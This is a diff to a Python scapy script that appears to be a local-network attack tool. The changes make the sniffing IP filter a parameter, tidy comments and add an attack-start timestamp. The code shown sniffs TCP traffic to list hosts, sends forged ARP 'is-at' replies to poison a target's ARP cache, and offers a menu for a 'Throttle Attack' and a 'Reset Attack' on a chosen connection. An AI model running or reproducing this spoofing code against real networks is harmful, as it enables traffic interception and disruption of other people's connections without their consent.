@@ -22,20 +22,20 @@ def _input(message, input_type=int):
                 return input_type (input(message))
         except:pass
 
-def cleanlist(listof):
+def cleanlist(listof, filter):
     retList = []
  
     for x in listof:
         rSuffix = x.replace(':', ' ').replace('>', ' ').split()
         for y in rSuffix:
-            if("192." in y):
+            if(filter in y):
                 if (y in retList):
                     pass
                 else:
                     retList.append(y)
     return retList
 
-def GetList(filter):
+def GetList(filter, SearchFilter):
     packet = scapy.sniff(filter=filter,
       session=sessions.IPSession,  # defragment on-the-flow
     #   prn=lambda x: x.summary(),
@@ -44,10 +44,10 @@ def GetList(filter):
     retList = []
 
     for x in range(0,100):
-        if ("192." in packet[x][1].getlayer(IP).summary()):
+        if (SearchFilter in packet[x][1].getlayer(IP).summary()):
             AddThis = str(packet[x][1].getlayer(IP).summary())
             ListOfIP.append(AddThis)
-    retList = cleanlist(ListOfIP)
+    retList = cleanlist(ListOfIP, SearchFilter)
         
     return retList
 
@@ -67,7 +67,6 @@ def ChooseIP(IPList):
         try:
             while True:
                 valsrc = _input("Choose Source\n")
-                # print("length of IPList {}".format(n))
                 if valsrc <= n and n>0:
                     src = IPList[valsrc-1]
                     IPList.pop(valsrc-1)
@@ -81,7 +80,6 @@ def ChooseIP(IPList):
                         print("[{}] ".format(i) + x)
                     pass
                     
-
             for l in IPList:
                 j += 1
                 print("[{}] ".format(j) + l)
@@ -141,17 +139,15 @@ def spoof_delay(target_ip, host_ip, verbose=True):
     # get the mac address of the target
     target_mac = get_mac(target_ip)
     # craft the arp 'is-at' operation packet, in other words; an ARP response
-    # we don't specify 'hwsrc' (source MAC address)
-    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
     arp_response = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
     # send the packet
-    # verbose = 0 means that we send the packet without printing any thing
     verbose=0
     for x in range(1,4):
         print("{}. Package sent".format(x))
         scapy.send(arp_response, verbose)
         time.sleep(1)
 
+    # verbose = 0 means that we send the packet without printing any thing
     if verbose:
         # get the MAC address of the default interface we are using
         self_mac = scapy.ARP().hwsrc
@@ -209,16 +205,17 @@ def cancelConnection(source, dest):
             spoof_Cancel(dest)
             time.sleep(1)
     except:
-        print("\n Attempting to Cancel Reset Attack")
+        print("\nAttempting to Cancel Reset Attack")
         sys.exit()
 
 def main():
 
     print("Getting List\n")
     # Sniffing part
-
-    IPList = GetList("tcp")
+    IPList = GetList("tcp", "192.")
     src, dst = ChooseIP(IPList)
+
+    # Adding Timestamp for attack start
     print("Current Time: ", datetime.now())
     try:
         choice = _input("Press 1 for Throttle Attack\nPress 2 for Reset Attack\n")
